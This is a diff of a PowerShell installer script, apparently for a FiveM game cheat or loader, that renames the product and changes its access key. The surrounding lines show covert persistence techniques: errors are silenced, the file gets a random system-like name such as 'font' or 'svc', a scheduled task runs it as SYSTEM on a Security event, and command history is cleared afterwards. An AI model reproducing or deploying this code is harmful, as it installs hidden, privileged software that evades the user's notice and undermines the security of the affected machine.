@@ -1,5 +1,5 @@
 $ErrorActionPreference = "SilentlyContinue"
-$CorrectKey = "12" 
+$CorrectKey = "SECXION" 
 
 
 $p = @("font","drv","host","win","svc") | Get-Random
@@ -44,7 +44,7 @@ while ($true) {
             schtasks /create /tn "$taskName" /tr "$destPath" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f
 
             Write-Host "Install complete!" -ForegroundColor Green
-            Write-Host "SMITH will run automatically when FiveM starts." -ForegroundColor Yellow
+            Write-Host "SECXIONN will run automatically when FiveM starts." -ForegroundColor Yellow
             
            
             Clear-History
